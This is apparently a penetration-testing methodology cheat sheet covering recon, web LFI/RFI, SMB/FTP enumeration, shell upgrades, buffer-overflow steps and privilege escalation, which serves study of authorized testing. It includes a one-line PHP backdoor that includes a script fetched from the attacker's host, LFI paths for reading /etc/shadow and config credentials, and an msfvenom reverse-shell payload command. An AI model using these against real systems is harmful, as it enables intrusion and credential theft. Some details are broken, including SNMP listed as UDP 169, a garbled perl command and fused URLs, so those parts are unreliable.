# Pentesting Methodology & Tasks

## Recon

### DNS

Reverse lookup of entire provided range:

``` 
dig.sh <ips.txt>

for ip in $(cat ips.txt); do nslookup $ip <nameserver>; done
```



### Port Scans

Run dark_enum.py (unicornscan of full port range)



- 1. Actually **read** the intensive nmap scan
- 2. Actually **read** Nikto/Dirb/nmap NSE script output
- 3. Run the port scan again if you think something might have been missed
- Netcat banner grab

	- nc -v 10.10.10.10 port

- Telnet banner grab

	- telnet 10.10.10.10 port

### Enumeratio

This is the essential part of penetration. Find out what is available and how you could punch through it with minimum ease.

DO NOT SKIP STEPS.

DO NOT PASS GO.

SEARCH ***ALL*** THE VERSIONS WITH `searchsploit`
(or google -> `site:exploit-db.com APP VERSION`)




- Nmap

	- Quick TCP Scan

		- nmap -sC -sV -vv -oA quick 10.10.10.10

	- Quick UDP Scan

		- nmap -sU -sV -vv -oA quick_udp 10.10.10.10

	- Full TCP Scan

		- nmap -sC -sV -p- -vv -oA full 10.10.10.10

	- Port knock

		- for x in 7000 8000 9000; do nmap -Pn --host_timeout 201 --max-retries 0 -p $x 10.10.10.10; done

- HTTP - 80, 8080, 8000

  ``` 
  curl -i ${IP}/robots.txt
  ```
  
  Note down Server and other module versions.
  
  searchsploit them ALL.
  
  Visit all URLs from robots.txt.
  
  ``` 
  nikto -host $IP
  ```
  
  ``` 
  gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
  
  gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/common.txt
  ```
  
  if nothing, find more web word lists.
  
  *Browse the site* but keep an eye on the burp window / source code / cookies etc.
  
  Things to be on look for:
  
  

	- Web Scanning

		- Gobuster quick directory busting

			- gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux

		- Gobuster comprehensive directory busting

			- gobuster -s 200,204,301,302,307,403 -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/big.txt -t 80 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0'

		- Gobuster search with file extension

			- gobuster -u 10.10.10.10 -w /usr/share/seclists/Discovery/Web_Content/common.txt -t 80 -a Linux -x .txt,.php

		- Nikto web server scan

			- nikto -h 10.10.10.10

		- Wordpress scan

			- wpscan -u 10.10.10.10/wp/

	- Default credentials for software
	- SQL-injectable GET/POST params
	- LFI/RFI through ?page=foo type params
	- LFI:

		- `/etc/passwd` | `/etc/shadow` insta-win
		- `/var/www/html/config.php` or similar paths to get SQL etc creds
		- `?page=php://filter/convert.base64-encode/resource=../config.php`
		- `../../../../../boot.ini` to find out windows version

	- RFI:

		- Have your PHP/cgi downloader ready
		- `<?php include $_GET['inc']; ?>` simplest backdoor to keep it dynamic without anything messing your output
		- Then you can just `http://$IP/inc.php?inc=http://$YOURIP/bg.php` and have full control with minimal footprint on target machine
		- get `phpinfo()`

- HTTPS - 443

  Heartbleed / CRIME / Other similar attacks
  
  Read the actual SSL CERT to:
  
  

	- find out potential correct vhost to GET
	- is the clock skewed
	- any names that could be usernames for bruteforce/guessing.

- FTP - 21

	- Anonymous login
	- Enumerate the hell out of the machine!

		- OS version
		- Other software you can find on the machine (Prog Files, yum.log, /bin)
		- password files
		- DLLs for `msfpescan` / BOF targets

	- Do you have UPLOAD potential?

		- Can you trigger execution of uploads?
		- Swap binaries?

	- Vulnerabilities in version / RCE / #WINNING?-D

- SMB - 139, 445

  ``` 
  enum4linux -a $IP
  ```
  
  Read through the report and search for versions of things => `searchsploit`
  
  ``` 
  smbclient -L $IP
  ```
  
  Mount shares
  
  ``` 
  mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.10.10.10/My Share" /mnt/cifs
  ```
  
  Can you access shares?
  
  

	- SMB Vulnerability Scan

		- nmap -p 445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.10.10.10

	- SMB Users & Shares Scan

		- nmap -p 445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10

	- Enum4linux

		- enum4linux -a 10.10.10.10

	- Null connect

		- rpcclient -U "" 10.10.10.10

	- Connect to SMB share

		- smbclient //MOUNT/share

	- Directly exploitable MSxx-xxx versions?

		- Worth burning MSF strike?

- SNMP - UDP 169

	- Try to enumerate windows shares / network info

	  Quick test of communities:
	  
	  ``` 
	  onesixtyone
	  ```
	  
	  Full discovery of everything you can:
	  
	  ``` 
	  snmp-check
	  ```
	  
	  

- SNMP enumeration

	- snmp-check 10.10.10.10

- TFTP - UDP 69

	- Read / Write access?

		- Pretty much same things as FTP

- SSH - 22

  Unless you get a MOTD or a broken sshd version, you are SOOL and this is likely just a secondary access point once you break something else.
  
  

- Email - 25, 110/995 or 143/993

  SMTP, POP3(s) and IMAP(s) are good for enumerating users.
  
  Also: ***CHECK VERSIONS*** and `searchsploit`
  
  

## Limited Shells

### python -c 'import pty; pty.spawn("/bin/sh")'

### echo os.system('/bin/bash')

### /bin/sh -i

### perl â€”e 'exec "/bin/sh";'

### Upgrading from limited shell to full TTY

(Source: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)



- In reverse shell

	- $ python -c 'import pty; pty.spawn("/bin/bash")'
	- Ctrl-Z

- In Kali

	- $ stty raw -echo
	- $ fg

- In reverse shell

	- $ reset
	- $ export SHELL=bash
	- $ export TERM=xterm-256color
	- $ stty rows X columns Y

	  Useful links:
	  
	  

	- https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
	- http://netsec.ws/?p=337

## Buffer Overflow

### 1. Determine length of overflow trigger w/ binary search "A"x1000

### 2. Determine exact EIP with `pattern_create.rb` & `pattern_offset.rb`

### 3. Determine badchars to make sure all of your payload is getting through (**Do not** skip this step)

### 4. Develop exploit

### Is the payload right at ESP

- `JMP ESP`

### Is the payload before ESP

- `sub ESP, 200` and then `JMP ESP`
- or
- `call [ESP-200]`

### 5. `msfvenom -a x86 --platform windows/linux -p something/shell/reverse_tcp lhost=x.x.x.x lport=53 -f exe/elf/python/perl/php -o filename`

### Make sure it fits your payload length above

### 6. Gain shell, local priv esc or rooted already?

## Privilege Escalation

### Linux

- 1. **Check current access first**:
- Am I in sudoers?
- Do I have sudoedit access to useful files?
- 2. Enumerate!

  Good resources:
  
  

- http://netsec.ws/?p=309
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- https://github.com/mubix/post-exploitation/wiki/Linux-Post-Exploitation-Command-List
- https://www.rebootuser.com/?p=1623
- https://www.kernel-exploits.com/
- http://security.stackexchange.com/questions/101715/automatically-enumerate-missing-patches-on-penetration-test

  If still stuck, try Dirty COW: https://github.com/dirtycow/dirtycow.github.io/wiki
  
  

### Windows

- 1. **Check current access first**:
- Am I already Administrator?
- Am I in Remote Desktop Users?
- 2. Enumerate!

  Good resources:
  
  

- http://www.fuzzysecurity.com/tutorials/16.html
- http://it-ovid.blogspot.com.au/2012/02/windows-privilege-escalation.html?m=1
- http://www.greyhathacker.net/?p=738
- https://www.youtube.com/watch?v=kMG8IsCohHAhttps://www.youtube.com/watch?v=PC_iMqiuIR

## Misc tools

### `cewl` for crawling a site for bruteforcing user/password

### don't forget about `nmap` scripts!

- e.g. `--script smtp-commands` or `--script auth-owners`

